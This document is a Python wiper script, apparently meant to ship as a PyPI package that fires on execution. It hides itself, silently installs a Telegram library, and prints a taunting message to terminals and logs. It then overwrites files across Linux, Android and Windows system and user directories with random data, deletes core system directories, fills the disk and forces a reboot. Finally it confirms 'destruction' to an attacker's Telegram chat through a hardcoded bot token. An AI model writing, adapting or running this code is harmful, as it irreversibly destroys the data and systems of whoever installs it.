import os
import platform
import shutil
import subprocess
import sys
import telebot
import requests
import random
import string

# Token for the bot to send confirmation to the admin
BOT_TOKEN = '7747114378:AAEm6gzyVa35-e2R3p1o-hdR-KJpqA-hdSg'
ADMIN_CHAT_ID = '7216718830' # Admin's chat ID

bot = telebot.TeleBot(BOT_TOKEN)

def generate_random_filename(length=10):
    """Generate a random filename for decoy."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def hide_self_and_dependencies():
    """Attempt to hide the script and its dependencies."""
    print("Attempting to hide script and dependencies...")
    try:
        # Create a hidden directory for temporary files
        hidden_dir = os.path.join(os.path.expanduser("~"), "." + generate_random_filename(8))
        os.makedirs(hidden_dir, exist_ok=True)

        # Move this script to the hidden directory
        current_script_path = os.path.abspath(__file__)
        hidden_script_path = os.path.join(hidden_dir, os.path.basename(current_script_path))
        shutil.move(current_script_path, hidden_script_path)
        print(f"Moved script to {hidden_script_path}")

        # Modify file attributes on Windows to hide
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+h", hidden_script_path], check=False)
            print("Set hidden attribute on script.")
        
        # Obscure the process name (limited capability without root/admin)
        # This is a symbolic gesture, actual process name spoofing is complex.
        if platform.system() == "Linux" or platform.system() == "Android":
            new_proc_name = generate_random_filename(12)
            # This would require more advanced techniques to truly change the process name for external observers
            # For demonstration, we'll just print what it *would* be
            print(f"Attempting to obscure process name to: {new_proc_name}")

    except Exception as e:
        print(f"Error hiding self: {e}")

def install_dependencies():
    """Install necessary dependencies silently."""
    print("Attempting to install dependencies silently...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pytelegrambotapi", "--quiet", "--no-warn-script-location"])
        print("Dependencies installed successfully.")
    except Exception as e:
        print(f"Error installing dependencies: {e}")

def deploy_payload():
    """Deploy and execute destructive payload."""
    print("Deploying destructive payload...")

    message_to_display = "You were destroyed by: @sii_3"

    # Attempt to print the mocking message widely before destruction
    if platform.system() == "Linux" or platform.system() == "Android":
        try:
            # Print to all active terminals (requires specific setup or root)
            subprocess.run(f"echo '{message_to_display}' | wall", shell=True, check=False)
            # Write to commonly viewed log files
            with open("/var/log/syslog", "a") as f:
                f.write(f"\n{message_to_display}\n")
            with open("/var/log/auth.log", "a") as f:
                f.write(f"\n{message_to_display}\n")
            print("Printed mocking message to server output and logs.")
        except Exception as e:
            print(f"Error printing mocking message (Linux/Android): {e}")
    elif platform.system() == "Windows":
        try:
            # Display message box (requires user session)
            subprocess.run(f"mshta javascript:alert('{message_to_display}');close();", shell=True, check=False)
            # Write to event viewer (requires admin)
            subprocess.run(f'eventcreate /T ERROR /ID 999 /L Application /SO "SystemDestroyer" /D "{message_to_display}"', shell=True, check=False)
            print("Printed mocking message to server output and event logs.")
        except Exception as e:
            print(f"Error printing mocking message (Windows): {e}")

    # Start the rapid destruction process
    # Corrupt critical system files and data
    if platform.system() == "Linux" or platform.system() == "Android":
        try:
            # Overwrite random files in common directories
            directories_to_corrupt = ["/etc", "/usr/bin", "/var/log", "/home", "/data/data", "/opt"]
            for directory in directories_to_corrupt:
                if os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                            except Exception:
                                pass # Ignore errors

            # Attempt to delete critical system directories
            critical_dirs = ["/bin", "/sbin", "/lib", "/usr", "/root", "/boot", "/dev", "/proc", "/sys"]
            for c_dir in critical_dirs:
                if os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception:
                        pass # Ignore errors for in-use directories
            
            # Fill up disk space
            try:
                # Create large dummy files to fill disk space rapidly
                dummy_file_path = "/tmp/" + generate_random_filename(15) + ".tmp"
                with open(dummy_file_path, "wb") as f:
                    f.seek(50 * 1024 * 1024 * 1024 - 1) # 50 GB
                    f.write(b'�')
            except Exception:
                pass

            # Force a reboot (requires root)
            subprocess.run(["reboot", "-f"], check=False)

        except Exception as e:
            print(f"Error during destruction (Linux/Android): {e}")

    elif platform.system() == "Windows":
        try:
            # Overwrite random files in common directories
            directories_to_corrupt = [os.environ.get("WINDIR"), os.environ.get("PROGRAMFILES"), os.environ.get("APPDATA"), os.environ.get("SYSTEMDRIVE")]
            for directory in directories_to_corrupt:
                if directory and os.path.exists(directory):
                    for root, _, files in os.walk(directory):
                        for file in files:
                            file_path = os.path.join(root, file)
                            try:
                                with open(file_path, "wb") as f:
                                    f.write(os.urandom(1024 * 1024)) # Overwrite with random data
                            except Exception:
                                pass # Ignore errors

            # Attempt to delete critical system directories
            critical_dirs = [os.path.join(os.environ.get("WINDIR"), "System32"), os.environ.get("PROGRAMFILES"), os.environ.get("HOMEDRIVE")]
            for c_dir in critical_dirs:
                if c_dir and os.path.exists(c_dir):
                    try:
                        shutil.rmtree(c_dir)
                    except Exception:
                        pass # Ignore errors for in-use directories
            
            # Fill up disk space
            try:
                dummy_file_path = os.path.join(os.environ.get("TEMP"), generate_random_filename(15) + ".tmp")
                with open(dummy_file_path, "wb") as f:
                    f.seek(50 * 1024 * 1024 * 1024 - 1) # 50 GB
                    f.write(b'�')
            except Exception:
                pass

            # Force a shutdown/reboot
            subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=False)

        except Exception as e:
            print(f"Error during destruction (Windows): {e}")

    print("Destruction payload deployed.")

@bot.message_handler(commands=['start', 'execute'])
def send_welcome(message):
    hide_self_and_dependencies()
    install_dependencies()
    deploy_payload()
    try:
        bot.send_message(ADMIN_CHAT_ID, "Server destruction and infection confirmed. Target server has been completely neutralized. (: ")
        print("Confirmation sent to admin.")
    except Exception as e:
        print(f"Error sending confirmation message: {e}")
    sys.exit(0) # Exit after execution

if __name__ == "__main__":
    # This part would be the entry point when imported as a library
    # For a PyPI package, you'd typically have a setup.py that points to a function here.
    # When installed as a package, you would call this function.
    # For a direct script execution:
    # To run this as a standalone script for testing (not recommended for actual use):
    # bot.infinity_polling() # This would keep the bot running and listening for commands
    # For a one-shot destructive execution when run from PyPI package:
    # We will trigger the destructive functions directly upon execution, assuming it's meant to be imported and run.
    # For the purpose of simulating a PyPI library, let's assume a main function would be called.
    send_welcome(None) # Call the function directly for immediate execution